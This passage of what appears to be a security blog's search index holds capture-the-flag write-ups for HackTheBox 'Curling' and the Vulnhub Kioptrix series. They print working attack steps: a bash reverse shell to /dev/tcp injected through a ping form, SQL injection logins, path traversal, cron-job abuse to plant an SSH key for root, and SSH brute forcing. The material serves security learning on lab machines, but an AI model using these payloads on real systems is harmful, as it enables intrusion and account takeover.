2018 x86_64Meterpreter : php/linuxmeterpreter &gt; getuidServer username: www-data (33)meterpreter &gt; Boom we get a shell as www-data :PGetting Userunable to read user.txt due to insufficient permissons so need to esculate.looking around the system there is a intreasting file/home/floris/password_backupcat password_backup00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:400000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........400000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....100000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.\"000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.000000f0: 819b bb48                                ...HThis looks like a hex dumpcopied the file of the box and used xxd to convert the file back into binary formatroot@kali2:~/challenges/hackthebox/curling# xxd -r password_backup data.outroot@kali2:~/challenges/hackthebox/curling# file data.out              data.out: bzip2 compressed data, block size = 900kroot@kali2:~/challenges/hackthebox/curling# cat data.out               BZh91AY&amp;SY���H���A��P)ava�:4N���nT#�@%�` \"��n�                                    ��z�@�i�4hdi���9�h�Q�dh����4i�5n�׌��Jh��*��}y.�&lt;~�x�&gt;  �sVT�zH�ߢ�1�V��`F���s     ۇ7j:X�dR��k�� ���)p�7۫;���9��PC�Y�P\t�HB��*\t��G� �U@r�rE8P����H#   bzip2the file was confirmed to be a bzip2 so let’s decompress it…root@kali2:~/challenges/hackthebox/curling# bzip2 -d data.outbzip2: Can't guess original name for data.out -- using data.out.outgzipanother compressed file insideroot@kali2:~/challenges/hackthebox/curling# file data.out.out                   data.out.out: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141root@kali2:~/challenges/hackthebox/curling# mv data.out.out data.gzroot@kali2:~/challenges/hackthebox/curling# gunzip data.gzroot@kali2:~/challenges/hackthebox/curling# file datadownload: bzip2 compressed data, block size = 900kbzip…againand another…:Oroot@kali2:~/challenges/hackthebox/curling# mv data password.bz2root@kali2:~/challenges/hackthebox/curling# bzip2 -d password.bz2root@kali2:~/challenges/hackthebox/curling# file passwordpassword: POSIX tar archive (GNU)tartar - it keeps on goingroot@kali2:~/challenges/hackthebox/curling# tar xvf passwordpassword.txtroot@kali2:~/challenges/hackthebox/curling# cat password.txt5d&lt;wdCbdZu)|hChXllwoop! got there in the endNow on the box su was used to swtich over to floris and get the user flag.python3 -c 'import pty;pty.spawn(\"/bin/sh\")'$ su -l florissu -l florisPassword: 5d&lt;wdCbdZu)|hChXllfloris@curling:~$ cat user.txtcat user.txt65dd1d...Privesc to RootFirst, let’s upload our ssh key so we don’t have to rely on that meterpreter shell and get in nice and easyfloris@curling:~$ mkdir .sshmkdir .sshfloris@curling:~$ echo \"ssh-rsa AAAAB...DhscPOtelvd root@kali2\" &gt; .ssh/authorized_keys&lt;cPOtelvd root@kali2\" &gt; .ssh/authorized_keysIn admin-area folder, there are two files with a timestamp that keeps refreshing every few minutes:floris@curling:~/admin-area$ ls -latotal 12drwxr-x--- 2 root   floris 4096 May 22 19:04 .drwxr-xr-x 7 floris floris 4096 Oct 27 20:39 ..-rw-rw---- 1 root   floris   25 Oct 27 20:40 input-rw-rw---- 1 root   floris    0 Oct 27 20:40 reportfloris@curling:~/admin-area$ dateSat Oct 27 20:40:44 UTC 2018looks like there could be a cron job running as root. let’s confirm this by running a simple ps command in a bash loop:floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v \"grep --color\"; doneroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportroot      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/reportAs suspected, a cronjob executes curl using a input config file which we can write to.We will change the file to fetch our SSH public key and save it into root’s authorized_keys file:floris@curling:~/admin-area$ echo -ne 'output = \"/root/.ssh/authorized_keys\"\\nurl = \"http://10.10.14.23/key.txt\"\\n' &gt; inputfloris@curling:~/admin-area$ cat inputoutput = \"/root/.ssh/authorized_keys\"url = \"http://10.10.14.23/key.txt\"When the cronjob runs, it fetches our public key:root@kali2:~/challenges/hackthebox/curling# python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 port 80 ...10.10.10.150 - - [11/Dec/2018 16:52:56] \"GET /key.txt HTTP/1.1\" 200 -We can now SSH in as root:root@kali2:~/challenges/hackthebox/curling# ssh root@curling.htbWelcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat Oct 27 20:47:15 UTC 2018  System load:  0.13              Processes:            181  Usage of /:   46.3% of 9.78GB   Users logged in:      1  Memory usage: 22%               IP address for ens33: 10.10.10.150  Swap usage:   0%  =&gt; There is 1 zombie process.0 packages can be updated.0 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsroot@curling:~# cat root.txt82c198..."
  },
  
  {
    "title": "Kioptrix Level 2014 - Vulnhub",
    "url": "/posts/kioptrix-2014/",
    "categories": "CTF, Vulnhub",
    "tags": "CTF, Vulnhub",
    "date": "2017-03-18 13:52:16 +0100",
    





    "snippet": "Name: Kioptrix: 2014 (#5)Date release: 6 Apr 2014Author: KioptrixSeries: KioptrixWeb page: http://www.kioptrix.com/blog/a-new-vm-after-almost-2-years/Vulnhub: https://www.vulnhub.com/entry/kioptrix-2014-5,62/Host DiscoveryARParp-scan -lPingping 192.168.0.25Port ScanningTCPnmap -sS -A -sC -sV -O -p0- 192.168.0.25 -oA nmap_tcp_full_verOSscriptNmap scan report for 192.168.0.25Host is up (0.00057s latency).Not shown: 65533 filtered portsPORT     STATE  SERVICE VERSION22/tcp   closed ssh80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)|_http-title: Site doesn't have a title (text/html).8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)MAC Address: 00:0C:29:24:BF:7F (VMware)Device type: VoIP adapter|WAP|firewall|general purpose|storage-misc|broadband routerRunning: Cisco embedded, Linux 2.4.X|2.6.X, Netgear RAIDiator 4.X, Sun OpenSolaris, Vonage embedded, Zhone embeddedOS CPE: cpe:/h:cisco:unified_call_manager cpe:/o:linux:linux_kernel:2.4.36 cpe:/o:linux:linux_kernel:2.6.26 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:netgear:raidiator:4.1.4 cpe:/o:sun:opensolaris cpe:/h:vonage:v-portal cpe:/h:zhone:6211-i3Too many fingerprints match this host to give specific OS detailsNetwork Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.57 ms 192.168.0.25UDPnmap -sU -n 192.168.0.25 -oA nmap_udp_defNmap scan report for 192.168.0.25Host is up (0.00071s latency).All 1000 scanned ports on 192.168.0.25 are open|filteredMAC Address: 00:0C:29:24:BF:7F (VMware)Service Enumeration80 - HTTPhttp://192.168.0.20            ` nikto -h 192.168.0.25:80      tee nikto.txt`      - Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          192.168.0.25+ Target Hostname:    192.168.0.25+ Target Port:        80+ Start Time:         2017-06-21 08:58:22 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8+ Server leaks inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sat Mar 29 13:22:52 2014+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ 8346 requests: 1 error(s) and 11 item(s) reported on remote host+ End Time:           2017-06-21 09:00:04 (GMT-4) (102 seconds)---------------------------------------------------------------------------+ 1 host(s) testedpage source has some juciy infopChart 2.1.3We also get a URL to the apphttp://192.168.0.25/pChart2.1.3/examples/index.php8080 - HTTPhttp://192.168.0.20:8080Cant access this.ExploitationpChart- Local File InclusionUsing searchsploit we find an exploit that looks usable for pChartExploit Used: https://www.exploit-db.com/exploits/31173/There is a Local File Inclusion vulnerability which looks good to pull out./etc/passwdhttp://192.168.0.25/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwdat this point i was slowly running out of ideas here so did some google fu.httpd.confAt the bottom of the config we see some bits which suggests we need to change our user agent to connect on port 8080&lt;VirtualHost *:8080&gt;    DocumentRoot /usr/local/www/apache22/data2 &lt;Directory \"/usr/local/www/apache22/data2\"&gt;  Options Indexes FollowSymLinks  AllowOverride All  Order allow,deny  Allow from env=Mozilla4_browser &lt;/Directory&gt;&lt;/VirtualHost&gt;PHPTAX - Remote Code ExecutionUsing curl we change the User-Agent to try and access the webapp.curl -H \"User-Agent:Mozilla/4.0\" http://192.168.0.25:8080curl -H \"User-Agent:Mozilla/4.0\" http://192.168.0.25:8080/phptax/too messy lets look at it in Firefox. curl wasnt the best hereFirst we change the user agent following the advice belowhttps://superuser.com/questions/98798/how-do-i-change-firefoxs-user-agent-via-aboutconfigsetting the newly created string variable in Firefoxgeneral.useragent.overridetoMozilla/4.0 (X11; Linux x86_64; rv:10.0) Gecko/20100101 Firefox/10.0.http://192.168.0.25:8080/phptax/looks pretty coolI tried a few exploits but didnt get anywhere. Metasploit was useduse exploit/multi/http/phptax_exec set RPORT 8080 set URI /phptax/ set RHOST 192.168.0.25 runafter setting up and running it we successfully get a shell as user wwwPrivilege Esculationafter fumbling around in the limited shell and getting information we find a a priv esc exploitExploit Used: https://www.exploit-db.com/exploits/26368/netcat was on the machine but was giving me greif. I tried to setup a FTP server but nope.In the end fetch was available and we was able to move the code over to the box :Dafter pulling down the file using gcc to compile it and runall is well and…….got root 😎 😎 😎so lets get the flag"
  },
  
  {
    "title": "Kioptrix Level 1.3 (#4) - Vulnhub",
    "url": "/posts/kioptrix-level-4/",
    "categories": "CTF, Vulnhub",
    "tags": "CTF, Vulnhub",
    "date": "2017-03-15 13:52:16 +0100",
    





    "snippet": "Name: Kioptrix: Level 1.3 (#4)Date release: 8 Feb 2012Author: KioptrixSeries: KioptrixWeb page: http://www.kioptrix.com/blog/?p=604Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-13-4,25/Host DiscoveryArpdecided to use netdiscover this timenetdiscoverPingping 192.168.0.24Port ScanningTCPnmap -sS -A -sC -sV -O -p0- 192.168.0.24 -oA nmap_tcp_full_verOSscriptUDPnmap -sU -n 192.168.0.24 -oA nmap_udp_defService Enumeration22 - sshnothing here. no password :(80 - httphttp://192.168.0.24LigGoat secure Login Copyright (c) 2013!445 - SMBenum4linux 192.168.0.24 | tee enum4linux.txt ====================================== |    OS information on 192.168.0.24    | ====================================== [+] Got OS info for 192.168.0.24 from smbclient: Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a] ============================= |    Users on 192.168.0.24    | ============================= user:[nobody] rid:[0x1f5]user:[robert] rid:[0xbbc]user:[root] rid:[0x3e8]user:[john] rid:[0xbba]user:[loneferret] rid:[0xbb8] ========================================= |    Share Enumeration on 192.168.0.24    | ========================================= WARNING: The \"syslog\" option is deprecatedDomain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a][+] Attempting to map shares on 192.168.0.24//192.168.0.24/print$   Mapping: DENIED, Listing: N/A//192.168.0.24/IPC$ [E] Can't understand response:WARNING: The \"syslog\" option is deprecatedDomain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.28a]NT_STATUS_NETWORK_ACCESS_DENIED listing \\*Password Complexity: DisabledMinimum Password Length: 0S-1-22-1-1000 Unix User\\loneferret (Local User)S-1-22-1-1001 Unix User\\john (Local User)S-1-22-1-1002 Unix User\\robert (Local User)S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\\root (Local User)S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\\nobody (Local User)ExploitationStarting with the webapp. Supplying the username and password fields with a tick ‘ gives us a SQL error suggesting SQL injection attack here.we get a SQL error. taking this a step further using the usernames found from the enum4linux output and injecting a true MYSQL statement into the password field to try and loginUsername: JohnPassword: ‘ OR 1=1 #We can login :DJohns password is there for the taking.I logged in again with the same technique to get roberts passwordI logged in again with the same technique to get roberts passwordNot much else we can do with the LigGoat so i moved on the try and login to SSH with the creds obtained.We can login as John :DAfter trying to move around I was kicked out . The same was experience as RobertAfter a while playing with the limited shell and researchExploiting the echo command we break out into a bash shellecho os.system(‘/bin/bash’)Privilege EsculationNow we need to get rootLooking around the system and in /var/wwwInside the file checklogin.php with clear-text login credsTheres no root password either.Note - Never store creds on a system in clear-text. this will be picked up quick by someone who knows what they are doing. You can hash the value in config files using something like MD5Now we can jump into mysqlGot a little stuck here and banged my head against a wall for a bit. I found the following guidehttps://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/had a quick look for the file needed to do the businesslooks good. followed the guide and got root :P:PNever underestimate and forget the power of google. Step away from the problem for a while use google. Dont give up :DHope this was useful."
  },
  
  {
    "title": "Kioptrix Level 1.2 (#3) - Vulnhub",
    "url": "/posts/kioptrix-level-3/",
    "categories": "CTF, Vulnhub",
    "tags": "CTF, Vulnhub",
    "date": "2017-03-11 13:52:16 +0100",
    





    "snippet": "Name: Kioptrix: Level 1.2 (#3)Date release: 18 Apr 2011Author: KioptrixSeries: KioptrixWeb page: http://www.kioptrix.com/blog/?p=358Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-12-3%2C24/Host DiscoveryArparp-scan -lPingping 192.168.0.20Port ScanningTCPnmap -sS -A -sC -sV -O -p0- 192.168.0.20 -oA nmap_tcp_full_ver_sVUDPnmap -sU -n -oA nmap_udp_def 192.168.0.20No UDP ports found openService Enumeration22 - sshcant login. nothing of note80 - httphttp://192.168.0.20Found a login pagehttp://192.168.0.20/index.php?system=AdminLotusCMSnikto -h 192.168.0.20- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP:          192.168.0.20+ Target Hostname:    192.168.0.20+ Target Port:        80+ Start Time:         2017-06-19 11:32:35 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ Cookie PHPSESSID created without the httponly flag+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ /phpmyadmin/: phpMyAdmin directory found+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.+ 7534 requests: 0 error(s) and 19 item(s) reported on remote host+ End Time:           2017-06-19 11:32:57 (GMT-4) (22 seconds)---------------------------------------------------------------------------+ 1 host(s) testeddirb http://192.168.0.20A few intreasting directories---- Scanning URL: http://192.168.0.20:80/ ----==&gt; DIRECTORY: http://192.168.0.20:80/cache/==&gt; DIRECTORY: http://192.168.0.20:80/core/+ http://192.168.0.20:80/data (CODE:403|SIZE:323)+ http://192.168.0.20:80/favicon.ico (CODE:200|SIZE:23126)==&gt; DIRECTORY: http://192.168.0.20:80/gallery/+ http://192.168.0.20:80/index.php (CODE:200|SIZE:1819)==&gt; DIRECTORY: http://192.168.0.20:80/modules/==&gt; DIRECTORY: http://192.168.0.20:80/phpmyadmin/+ http://192.168.0.20:80/server-status (CODE:403|SIZE:332)==&gt; DIRECTORY: http://192.168.0.20:80/style/http://192.168.0.20/phpmyadmin/phpmyadmin - 2.11.3.0ExploitationWe find an intreasting module to use in metasploitexploit/multi/http/lcms_php_execExecution of the exploit gives us a shell with www-data permissionsPrivilege EsculationLooking around the file systemI found the user loneferret so decided to try bruteforce SSH using hydra. More on this laterGconfig.php has mysql creds stored in clear-text which will be useful..Checking back on my bruteforcing a little later we have a hithydra -e nsr -l loneferret -P /usr/share/wordlists/rockyou.txt ssh -t 4Now SSH’d in as loneferret:starwarssudo htgives us an error but using google fu we find a quickfixhttps://stackoverflow.com/questions/6804208/nano-error-error-opening-terminal-xterm-256colorOnce we get it working we are faced with this screen.After fighting with the gui and figuring out how to use this I open /etc/sudoers using alt+fI added , /bin/sh to the end so we can bump to root.Try againgot root :P"
  },
  
  {
    "title": "Kioptrix Level 1.1 (#2) - Vulnhub",
    "url": "/posts/kioptrix-level-2/",
    "categories": "CTF, Vulnhub",
    "tags": "CTF, Vulnhub",
    "date": "2017-02-25 13:52:16 +0100",
    





    "snippet": "So im adding all the writeups I did leading up to OSCP following on with Kioptrix level 2.Name: Kioptrix: Level 1.1 (#2)Date release: 11 Feb 2011Author: KioptrixSeries: KioptrixWeb page:http://www.kioptrix.com/blog/?page_id=135 Vulnhub: https://www.vulnhub.com/entry/kioptrix-level-11-2,23/Description:This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.This is the second release of #2. First release had a bug in it with the web applicationHost Discoveryarp-scan -lPort ScanningTCPnmap -F -sS 192.168.0.18I also ran a more indepth scannmap -sS -A -sC -p0- -oA nmap_tcp_full_sCA_192.168.0.18 192.168.0.18UDPI decided to use nmap to run a scan of full UDP ports playing with the timing switchesnmap --min-parallelism 100 --min-rtt-timeout 26ms --max-rtt-timeout 160ms --max-retries 2 --max-scan-delay 0 --min-rate 1000 -p0- -sU -oA nmap_udp_full 192.168.0.18PORT    STATE SERVICE111/udp open  rpcbindService Enumeration80 - http443 - httpshttp://192.168.0.18/ - a login pagenikto -h 192.168.0.18+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.!+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3268: /manual/assets/images/: Directory indexing found.![]+  /icons/README: Apache default file found.![]+ Server: Apache/2.0.52 (CentOS)3306 - mysqlExploitationSo it looks like we need to try and get past the login page.At this point i decided to start fuzzing the login page to try and find an injection flaw. I was able to successfully login using the value below in the username and password fields.' or 1=1--Using SQL injection to supply a truestatement in the username and password fields logged us in sucessfully :DWe get a simple web based ping toolThe ping tool worksIt seems like the OS ping command is being used to carry out this task.Looks like we can abuse this feild to get code execution.127.0.0.1; whoamiLets try get a shell :Pnetcat listener is setup on the attacking kali machine (192.168.0.21).nc -nlvp 4444Now we inject our payload127.0.0.1; bash -i &gt;&amp; /dev/tcp/192.168.0.21/4444 0&gt;&amp;1Boom! we get a shell but its as a low privileged user apachePrivilege Esculationwe are in but its not good enoughh want root!using g0m1lks privilege escalation guide we start to look for a way to escalatehttps://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/I noticed the target is running a vulnerable Linux kernelsearchsploit was used to find a priv esc exploitExploit Used: https://www.exploit-db.com/exploits/9542/The exploit was downloaded and transferred over to the target using wgetcompiled using gcc on the targetTime to executegot root :P"
  },
  
  {
    "title": "Kioptrix Level 1 - Vulnhub",
    "url": "/posts/kioptrix-level-1/",
    "categories": "CTF, Vulnhub",
    "tags": "CTF, Vulnhub",
    "date": "2017-02-17 13:52:16 +0100",
    





    "snippet": "This is a challenge writeup on my blog to sharpen my markdown skillz and figure out a nice template going forward! A nice ez box to start with :DName: Kioptrix: Level 1 (#1)Date release: 17 Feb 2010Author: KioptrixSeries: KioptrixWeb page: http://www.kioptrix.com/blog/?page_id=135Vulnhub URL: https://www.vulnhub.com/entry/kioptrix-level-1-1,22/Description:This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.Port ScanningTCPnmap -sS -n -oN 192.168.0.23.quick.nmap 192.168.0.23PORT     STATE SERVICE     REASON         VERSION22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 2.9p2 (protocol 1.99)80/tcp   open  http        syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd (workgroup: MYGROUP)443/tcp  open  ssl/http    syn-ack ttl 64 Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)UDPDecided to mix it up and use unicorncan here.unicornscan -mU -r200-Iv -p 0-65535 -l 192.168.0.23_udp.unicorn 192.168.0.23Service Enumeration22 - sshssh 192.168.0.23Not that easy. Default and silly credentials didnt work here (root:root, est)80 - httphttp://192.168.0.23Just some default content. I ran Nikto and Dirb against the web service which returned a few bits.nikto -h 192.168.0.23dirb http://192.168.0.23Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b/test.phpAllowed HTTP Methods: GET, HEAD, OPTIONS, TRACE OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XSTOSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.OSVDB-3268: /manual/: Directory indexing found.OSVDB-3092: /manual/: Web server manual found.OSVDB-3268: /icons/: Directory indexing found.OSVDB-3233: /icons/README: Apache default file found.OSVDB-3092: /test.php: This might be interesting...139 - netbiosenum4linux 192.168.0.23 &gt; enum4linux_192.168.0.23KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba ServerDomain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]//192.168.0.23/IPC$\t[E] Can't understand response://192.168.0.23/ADMIN$\t[E] Can't understand response:ExploitationExploit used: https://www.exploit-db.com/exploits/10/searchsploit sambasearchsploit was used to find a exploit in the version of samba running on portThe exploit was downloaded and compiledStarted a netcat listener on port 4444Run the exploitGet root shell on the target!😎😎😎From here we can get a tty and read the flag"
  }
  
]

